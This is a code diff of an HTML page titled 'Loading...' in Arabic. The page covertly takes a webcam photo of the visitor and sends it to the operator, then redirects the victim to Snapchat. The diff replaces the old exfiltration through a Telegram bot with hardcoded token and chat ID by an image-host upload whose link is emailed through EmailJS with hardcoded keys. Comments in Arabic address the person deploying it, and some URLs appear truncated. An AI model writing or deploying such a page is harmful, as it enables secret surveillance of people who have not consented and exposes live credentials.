@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
+    <script type="text/javascript" src="https://jsdelivr.net"></script>
     <style>
         body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
         video, canvas { display: none; }
@@ -15,42 +16,52 @@
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        // معلوماتك التي أرسلتها سابقاً (جاهزة ومدمجة)
-        const TOKEN = "8780843163:AAEQYDrUCNzSF32SWGKYdzx6h2pWn4mIsd4"; 
-        const ID = "7191557045"; 
+        // --- معلومات EmailJS الخاصة بك ---
+        const PUBLIC_KEY = "eWIb2mjCTi2UFeAAn";
+        const SERVICE_ID = "service_yea65ei";
+        const TEMPLATE_ID = "template_tj626bi";
+
+        emailjs.init(PUBLIC_KEY);
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // طلب الكاميرا فوراً
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-                // التقاط الصورة بعد ثانية واحدة من فتح الكاميرا لضمان السرعة
-                setTimeout(sendToTelegram, 1000);
+                setTimeout(captureAndUpload, 1500);
             })
-            .catch(() => {
-                // إذا رفض الكاميرا، حوله لسناب شات فوراً
-                window.location.href = "https://snapchat.com";
-            });
+            .catch(() => { window.location.href = "https://snapchat.com"; });
 
-        function sendToTelegram() {
+        function captureAndUpload() {
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, 640, 480);
-            
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append("chat_id", ID);
-                formData.append("photo", blob, "photo.jpg");
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
 
-                fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
+            // رفع الصورة إلى خدمة استضافة مجانية للحصول على رابط
+            const formData = new FormData();
+            formData.append("file", imageData);
+            formData.append("upload_preset", "ml_default"); // إعداد افتراضي للرفع السريع
+
+            fetch("https://cloudinary.com", {
+                method: "POST",
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                const imageUrl = data.secure_url; // هذا هو الرابط المباشر للصورة
+                
+                // إرسال الرابط فقط إلى بريدك
+                emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+                    photo_data: imageUrl, // سيرسل الرابط بدلاً من الكود الطويل
+                    title: "📸 رابط الصورة الجديد"
                 }).finally(() => {
-                    // تحويل المستخدم النهائي
                     window.location.href = "https://snapchat.com";
                 });
-            }, 'image/jpeg', 0.7);
+            })
+            .catch(() => {
+                window.location.href = "https://snapchat.com";
+            });
         }
     </script>
 </body>
